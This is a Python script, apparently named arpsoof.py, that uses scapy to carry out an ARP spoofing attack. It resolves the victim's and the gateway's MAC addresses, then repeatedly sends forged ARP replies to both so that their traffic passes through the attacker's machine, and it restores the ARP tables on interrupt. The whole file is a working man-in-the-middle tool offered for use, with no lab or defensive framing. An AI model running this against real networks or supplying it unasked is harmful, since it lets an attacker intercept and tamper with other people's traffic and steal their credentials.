from scapy.all import *
import sys
import time

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    answered = srp(broadcast / arp_request, timeout=2, verbose=False)[0]
    if answered:
        return answered[0][1].hwsrc
    return None


def spoof(victim_ip, gateway_ip):
    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if not victim_mac or not gateway_mac:
        print("[!] Could not get MAC addresses")
        return

    print(f"[*] Victim: {victim_ip} ({victim_mac})")
    print(f"[*] Gateway: {gateway_ip} ({gateway_mac})")
    print("[*] Spoofing started...")

    while True:
        send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip), verbose=False)
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip), verbose=False)
        time.sleep(2)


def restore(victim_ip, gateway_ip):
    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)
    send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=False)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip, hwsrc=victim_mac), count=5, verbose=False)
    print("\n[*] ARP tables restored")


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage:  sudo python3 arpsoof.py <victim_ip> <gateway_ip>")
        sys.exit()

    victim_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    
    
    try:
        spoof(victim_ip, gateway_ip)
    except KeyboardInterrupt:
        restore(victim_ip, gateway_ip)

